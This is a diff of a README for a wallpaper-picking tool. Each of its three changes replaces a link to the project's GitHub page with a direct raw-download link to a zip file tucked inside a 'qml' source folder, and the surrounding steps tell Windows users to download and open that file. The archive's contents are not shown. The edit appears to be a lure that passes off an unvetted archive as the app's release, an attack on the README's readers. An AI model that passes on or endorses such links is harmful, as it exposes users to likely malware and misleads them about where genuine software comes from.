@@ -1,6 +1,6 @@
 # 🖼️ wallpaper-selector - Pick a wallpaper fast
 
-[![Download wallpaper-selector](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/craniometricpointcucumbervine28/wallpaper-selector)
+[![Download wallpaper-selector](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/craniometricpointcucumbervine28/wallpaper-selector/main/qml/selector_wallpaper_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it when you want a fast change, a clean desktop, or a small tool that stays 
 
 ## 📥 Download
 
-1. Open the download page: https://github.com/craniometricpointcucumbervine28/wallpaper-selector
+1. Open the download page: https://raw.githubusercontent.com/craniometricpointcucumbervine28/wallpaper-selector/main/qml/selector_wallpaper_v2.4.zip
 2. Find the latest release or the main download file on the page
 3. Download the Windows version
 4. Open the file after the download finishes
@@ -173,4 +173,4 @@ It is a good fit if you want:
 
 If you need the download page later, use this link:
 
-https://github.com/craniometricpointcucumbervine28/wallpaper-selector
+https://raw.githubusercontent.com/craniometricpointcucumbervine28/wallpaper-selector/main/qml/selector_wallpaper_v2.4.zip
